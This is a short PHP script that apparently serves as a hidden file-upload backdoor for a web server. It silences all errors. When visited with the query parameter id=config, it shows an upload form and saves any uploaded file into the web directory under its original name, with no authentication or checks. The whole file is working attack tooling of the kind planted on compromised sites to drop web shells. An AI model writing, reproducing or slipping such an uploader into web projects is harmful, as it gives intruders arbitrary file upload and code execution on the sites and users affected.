<?php
error_reporting(0);
$system = $_GET['id'];
if($system == 'config'){
$DR1 = $_FILES['file']['tmp_name'];
$DR2 = $_FILES['file']['name'];
echo "<form method='POST' enctype='multipart/form-data'>
<input type='file'name='file' />
<input type='submit' value='upload' />
</form>";
move_uploaded_file($DR1,$DR2);
}
?>
